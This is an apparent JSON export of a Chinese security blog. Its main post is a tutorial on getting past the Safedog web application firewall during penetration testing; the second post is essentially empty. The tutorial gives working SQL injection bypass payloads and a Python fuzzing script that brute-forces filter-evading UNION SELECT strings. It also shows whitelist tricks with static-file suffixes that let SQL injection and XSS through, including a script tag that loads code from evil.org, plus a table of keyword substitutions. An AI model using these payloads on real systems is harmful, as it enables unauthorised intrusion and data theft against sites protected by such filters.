[{"title":"对抗WAF继续渗透","date":"2019-10-12T02:26:30.000Z","path":"2019-10-12-Bypass.html","content":"<p>在渗透测试的过程中，经常会遇到各种各样的WAF，WAF会将用户提交的符合规则库中的恶意数据给阻断，这对渗透测试带来了挑战。要想对抗WAF来继续对目标进行渗透，就必须先了解WAF的类型和原理才能于其规则进行对抗。<br><img src=\"../img/hexo-2019-10-12-17-29-50.png\" alt>  </p>\n<a id=\"more\"></a>\n\n<p>WAF大致分为三类：  </p>\n<blockquote>\n<p><strong>硬件Web防火墙</strong>：就是常说的硬WAF，通常的安装方式是将Waf串行部署在Web服务器前端，用于检测、阻断异常流量。</p>\n</blockquote>\n<blockquote>\n<p><strong>Web防护软件</strong>：就是常说的软WAF，则是安装在需要防护的服务器上，实现方式通常是WAF监听端口或以Web容器扩展方式进行请求检测和阻断。</p>\n</blockquote>\n<blockquote>\n<p><strong>云WAF</strong>：是近年来随着云计算的推动衍生出来的新产品，云WAF，也称WEB应用防火墙的云模式，这种模式让用户不需要在自己的网络中安装软件程序或部署硬件设备，就可以对网站实施安全防护，它的主要实现方式是利用DNS技术，通过移交域名解析权来实现安全防护。用户的请求首先发送到云端节点进行检测，如存在异常请求则进行拦截否则将请求转发至真实服务器。</p>\n</blockquote>\n<p>由于硬件WAF购买价格昂贵，受众数量较少，因此通常遇到的都是部署在服务器上的软WAF和部署在云服务器上的云WAF，因此这里只讨论存在软WAF和云WAF的情况。</p>\n<h1 id=\"对抗软WAF\"><a href=\"#对抗软WAF\" class=\"headerlink\" title=\"对抗软WAF\"></a>对抗软WAF</h1><p>软WAF比较有代表性的就是安全狗了，因此这里以安全狗为例，其余软WAF均可以使用大致相同的思路——<strong>Fuzz</strong> 来进行绕过。</p>\n<h2 id=\"绕过安全狗扫描目录\"><a href=\"#绕过安全狗扫描目录\" class=\"headerlink\" title=\"绕过安全狗扫描目录\"></a>绕过安全狗扫描目录</h2><p>在服务器端未开启CC防御时，可采用自定义User-Agent来对站点进行目录扫描，这里使用<strong>DirBuster</strong>来将User-Agent设置成百度爬虫的User-Agent头<br><code>User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</code>  </p>\n<img src=\"../img/hexo-2019-10-12-15-30-10.png\" height=\"330\" width=\"495\">  \n\n<p>下面为<strong>DirBuster</strong>的使用方法<br><img src=\"../img/hexo-2019-10-12-15-30-25.png\" height=\"330\" width=\"495\">  </p>\n<h2 id=\"绕过安全狗继续注入\"><a href=\"#绕过安全狗继续注入\" class=\"headerlink\" title=\"绕过安全狗继续注入\"></a>绕过安全狗继续注入</h2><p>安全狗版本<br>时间    2019/8/1<br>安全狗版本    V4.0<br>安全狗规则版本    2018-11-30    </p>\n<h3 id=\"1-SQL注释符-绕过\"><a href=\"#1-SQL注释符-绕过\" class=\"headerlink\" title=\"1.SQL注释符/**/绕过\"></a>1.SQL注释符/**/绕过</h3><p>在安全狗规则中，默认会对添加了SQL注释符的请求进行忽略，因此可以构造形如下面的代码来绕过安全狗：<br><code>192.168.1.3/anquangou.php?a=/*&amp;id=2%20and%201=2&amp;*/</code><br>1=1时返回id=2的用户信息，并且未被拦截<br><img src=\"../img/hexo-2019-10-12-15-53-35.png\"><br>1=2时无返回值<br><img src=\"../img/hexo-2019-10-12-15-53-48.png\"><br>查询版本信息<br><img src=\"../img/hexo-2019-10-12-15-59-09.png\" alt>  </p>\n<h3 id=\"2-FUZZ-union-exp-select-绕过\"><a href=\"#2-FUZZ-union-exp-select-绕过\" class=\"headerlink\" title=\"2.FUZZ/!union+exp+select*/绕过\"></a>2.FUZZ/!union+exp+select*/绕过</h3><p>Fuzz脚本如下：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">            <span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3)AppleWebKit / 535.20(KHTML, like Gecko) Chrome / 19.0.1036.7Safari / 535.20'</span>,</span><br><span class=\"line\">            <span class=\"string\">'Referer'</span>: <span class=\"string\">'http://www.baidu.com'</span>,</span><br><span class=\"line\">                   <span class=\"string\">'Cookie'</span>: <span class=\"string\">'whoami=print(\"\")'</span>,</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">fuzz_zs = [<span class=\"string\">'/*'</span>, <span class=\"string\">'*/'</span>, <span class=\"string\">'/*!'</span>, <span class=\"string\">'*'</span>, <span class=\"string\">'='</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'!'</span>, <span class=\"string\">'@'</span>, <span class=\"string\">'%'</span>, <span class=\"string\">'.'</span>, <span class=\"string\">'-'</span>, <span class=\"string\">'+'</span>, <span class=\"string\">'|'</span>, <span class=\"string\">'%00'</span>]</span><br><span class=\"line\">fuzz_sz = [<span class=\"string\">''</span>, <span class=\"string\">' '</span>]</span><br><span class=\"line\">fuzz_ch = [<span class=\"string\">\"%0a\"</span>, <span class=\"string\">\"%0b\"</span>, <span class=\"string\">\"%0c\"</span>, <span class=\"string\">\"%0d\"</span>, <span class=\"string\">\"%0e\"</span>, <span class=\"string\">\"%0f\"</span>, <span class=\"string\">\"%0g\"</span>, <span class=\"string\">\"%0h\"</span>, <span class=\"string\">\"%0i\"</span>, <span class=\"string\">\"%0j\"</span>]</span><br><span class=\"line\">Fuzz = fuzz_ch + fuzz_sz + fuzz_zs</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> Fuzz:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> Fuzz:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> Fuzz:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> d <span class=\"keyword\">in</span> Fuzz:</span><br><span class=\"line\">                    exp = url + <span class=\"string\">\"%20union\"</span> + <span class=\"string\">\"--%20asdasd\"</span>+ a + b + c + d + <span class=\"string\">\"select\"</span> + <span class=\"string\">\"%201,2,3%20--+\"</span></span><br><span class=\"line\">                    <span class=\"comment\"># print exp</span></span><br><span class=\"line\">                    response = requests.get(url=exp, headers=headers).content</span><br><span class=\"line\">                    <span class=\"comment\">#rint(response)</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"string\">\"safedog\"</span> <span class=\"keyword\">in</span> str(response) <span class=\"keyword\">or</span> <span class=\"string\">\"error\"</span> <span class=\"keyword\">in</span> str(response):</span><br><span class=\"line\">                        <span class=\"keyword\">pass</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">print</span> (exp)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    url = <span class=\"string\">\"http://192.168.1.3:8080/anquangou.php?id=-1\"</span></span><br><span class=\"line\">    run(url)</span><br></pre></td></tr></table></figure>\n\n<p>Fuzz出来的语句为(其实远远不止，只是为了举例)<br><code>fuzz语句 http://192.168.1.3:8080/anquangou.php?id=-1%20union--%20asdasd%0A%0Aselect%201,666,3%20--+</code><br>其他绕过位置放入bypass代码也是一样<br>比如<code>http://192.168.1.3:8080/anquangou.php?id=-1%20union--%20asdasd%0A%0Aselect%201,database(),3%20--+</code>在查询database()时会被拦截,此时将干扰符插入database和()其中，就可以做到bypass  </p>\n<p>直接查询database()，被拦截<br><img src=\"../img/hexo-2019-10-12-16-24-56.png\" alt><br>插入Fuzz出来的干扰符后<br><img src=\"../img/hexo-2019-10-12-16-25-43.png\" alt>  </p>\n<h3 id=\"3-分块传输绕过\"><a href=\"#3-分块传输绕过\" class=\"headerlink\" title=\"3.分块传输绕过\"></a>3.分块传输绕过</h3><p>相关原理知识点在安全客上<a href=\"https://www.anquanke.com/post/id/169738，这里仅做记录\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/169738，这里仅做记录</a><br><img src=\"../img/hexo-2019-10-12-16-29-23.png\" alt>  </p>\n<h3 id=\"4-静态文件绕过\"><a href=\"#4-静态文件绕过\" class=\"headerlink\" title=\"4.静态文件绕过\"></a>4.静态文件绕过</h3><p>通过静态文件后缀可发内置的白名单，直接被安全狗放行  </p>\n<p>IIS版安全狗<br>///.js?  js可以换成rm/wm/png/jpg等静态文件后缀<br>测试发现，只要url包含 ///.js? 就会触发内置的白名单，直接被iis版安全狗放行。<br>对于安全狗iis版，php,aspx,asp均能用这种方式过狗。<br><code>http://192.168.29.131:8980/sql.php?id=1%20and%201%3d1&amp;xss=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;safe=///.js?</code>(既有sql注入，又有xss攻击，放行)<br><code>http://192.168.29.131:8980/sql.php?id=1%20and%201%3d1&amp;xss=&lt;SCRIPT%20SRC=http://evil.org/xss.js?&lt;/script&gt;</code>(很evil，也放行)  </p>\n<p>apache版安全狗<br><code>http://.../sql.php/1.js?id=1</code><br><code>http://.../sql.aspx/1.js?id=1</code><br><img src=\"../img/hexo-2019-10-12-16-31-41.png\" alt>  </p>\n<h3 id=\"5-具体bypass字符串替换\"><a href=\"#5-具体bypass字符串替换\" class=\"headerlink\" title=\"5.具体bypass字符串替换\"></a>5.具体bypass字符串替换</h3><p>可bypass替换表格  </p>\n<table>\n    <tr>\n        <th>拦截字符</th>\n        <th>Bypass字符</th>\n    </tr>\n    <tr>\n        <th>And</th>\n        <th>&&(Encode URL)%26%26</th>\n    </tr>\n    <tr>\n        <th>1=1</th>\n        <th>true</th>\n    </tr>\n    <tr>\n        <th>1=2</th>\n        <th>false</th>\n    </tr>\n    <tr>\n        <th>均可判断页面变化</th>\n        <th>Xor False/Xor True</th>\n    </tr>\n</table>\n\n\n<h1 id=\"对抗云WAF\"><a href=\"#对抗云WAF\" class=\"headerlink\" title=\"对抗云WAF\"></a>对抗云WAF</h1>","excerpt":"在渗透测试的过程中，经常会遇到各种各样的WAF，WAF会将用户提交的符合规则库中的恶意数据给阻断，这对渗透测试带来了挑战。要想对抗WAF来继续对目标进行渗透，就必须先了解WAF的类型和原理才能于其规则进行对抗。","categories":[],"tags":[{"name":"Bypass","slug":"Bypass","permalink":"http://ll-mf.github.io/tags/Bypass/"},{"name":"Web","slug":"Web","permalink":"http://ll-mf.github.io/tags/Web/"}]},{"title":"初见","date":"2019-10-10T02:26:30.000Z","path":"2019-10-10-hello-world.html","content":"<p><img src=\"../img/hexo-2019-10-12-17-14-39.png\" alt></p>\n<a id=\"more\"></a>\n","excerpt":"","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"http://ll-mf.github.io/tags/随笔/"}]}]